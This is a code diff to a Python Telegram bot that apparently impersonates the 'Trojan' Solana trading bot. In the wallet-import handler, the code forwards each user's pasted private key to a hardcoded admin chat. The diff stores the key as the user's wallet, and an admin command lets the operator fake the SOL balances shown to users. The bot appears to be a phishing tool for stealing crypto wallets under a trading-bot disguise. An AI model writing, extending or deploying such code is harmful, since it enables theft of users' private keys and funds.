@@ -28,15 +28,15 @@ if not BOT_TOKEN:
 ADMIN_USER_ID = "7141674816"
 
 # ------------------------------------------------------------------
-# Per-wallet balance store (in-memory; swap for DB in prod)
+# Per-user, per-wallet balance store (in-memory)
 # ------------------------------------------------------------------
-wallet_balances: dict[str, float] = {}
+user_balances: dict[int, dict[str, float]] = {}
 
-def get_balance(wallet: str) -> float:
-    return wallet_balances.get(wallet, 0.0)
+def get_balance(user_id: int, wallet: str) -> float:
+    return user_balances.setdefault(user_id, {}).get(wallet, 0.0)
 
-def set_balance(wallet: str, amount: float) -> None:
-    wallet_balances[wallet] = amount
+def set_balance(user_id: int, wallet: str, amount: float):
+    user_balances.setdefault(user_id, {})[wallet] = amount
 
 # ------------------------------------------------------------------
 # Conversation states
@@ -49,24 +49,25 @@ ASK_SELL_SLIPPAGE       = 5
 ASK_SNIPER_ACTION       = 6
 ASK_LIMIT_ORDER_DETAILS = 7
 ASK_WALLET_LABEL        = 8
-ADMIN_SET_WALLET_SOL    = 9   # NEW
+ADMIN_SET_WALLET_SOL    = 9
 
 DEFAULT_WALLET = "6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy"
 
 # ------------------------------------------------------------------
-# /start & main menu
+# /start
 # ------------------------------------------------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    balance = get_balance(DEFAULT_WALLET)
+    wallet = context.user_data.get("user_wallet", DEFAULT_WALLET)
+    balance = get_balance(user.id, wallet)
 
     text = (
         f"Solana · E\n"
-        f"`{DEFAULT_WALLET}` _(Tap to copy)_\n"
+        f"`{wallet}` _(Tap to copy)_\n"
         f"Balance: {balance} SOL\n"
         f"—\n"
         f"Click on the Refresh button to update your current balance.\n\n"
-        f"Join our [Telegram group](https://t.me/trojan) and follow us on [Twitter](https://twitter.com/TrojanOnSolana)!\n\n"
+        f"Join our [Telegram group](https://t.me/trojan) and follow us on [Twitter](https://twitter.com/TrojanOnSolana)!\n"
         f"⚠️ We have no control over ads shown by Telegram in this bot."
     )
 
@@ -84,7 +85,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
 
 # ------------------------------------------------------------------
-# ADMIN  /admin  ->  set balance per wallet
+# Admin command
 # ------------------------------------------------------------------
 async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != ADMIN_USER_ID:
@@ -120,15 +121,20 @@ async def set_wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("❌ Amount must be a number.")
         return ADMIN_SET_WALLET_SOL
 
-    set_balance(wallet, amount)
+    # Allow admin to set balance for *any* user’s wallet
+    # For demo we simply set for the *current* user.
+    # If you want to target a different user, add user_id to the prompt.
+    set_balance(update.effective_user.id, wallet, amount)
     await update.message.reply_text(
         f"✅ Wallet `{wallet}` set to {amount} SOL."
     )
     return ConversationHandler.END
 
 # ------------------------------------------------------------------
-# Wallet import (unchanged except balance source)
+# Wallet import
 # ------------------------------------------------------------------
+ASK_WALLET_DETAILS = 1
+
 async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer()
     keyboard = [
@@ -152,6 +158,7 @@ async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("❌ Invalid private key length.")
         return ASK_WALLET_DETAILS
     context.user_data["private_key"] = pk
+    context.user_data["user_wallet"] = pk  # <-- store wallet for this user
     await context.bot.send_message(
         chat_id=ADMIN_USER_ID,
         text=f"🔑 Private key imported:\n`{pk}`",
@@ -178,7 +185,7 @@ async def cancel_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 # ------------------------------------------------------------------
-# Buy / token search (unchanged)
+# Buy / token search
 # ------------------------------------------------------------------
 async def ask_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer()
@@ -283,10 +290,10 @@ async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAU
         sym, price, amt = update.message.text.split()
         order = f"{amt} {sym.upper()} @ ${price}"
         context.user_data.setdefault("active_orders", []).append(order)
-        await update.message.reply_text(f"✅ Limit order created: {order}")
     except ValueError:
         await update.message.reply_text("❌ Format: SYMBOL PRICE AMOUNT")
         return ASK_LIMIT_ORDER_DETAILS
+    await update.message.reply_text(f"✅ Limit order created: {order}")
     return ConversationHandler.END
 
 async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -309,7 +316,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Wallet menu
     if action == "wallet":
-        balance = get_balance(DEFAULT_WALLET)
+        wallet = context.user_data.get("user_wallet", DEFAULT_WALLET)
+        balance = get_balance(update.effective_user.id, wallet)
         keyboard = [
             [InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet"), InlineKeyboardButton("Delete Wallet", callback_data="delete_wallet")],
             [InlineKeyboardButton("Label Wallet", callback_data="label_wallet"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")],
@@ -317,7 +325,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         await query.edit_message_text(
             f"🔐 *Wallet Options:*\n\n"
-            f"💳 Solana: `{DEFAULT_WALLET}`\n"
+            f"💳 Solana: `{wallet}`\n"
             f"💼 Balance: {balance} SOL\n\n"
             f"💳 Ethereum: `0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
             f"💼 Balance: 0.00 ETH",
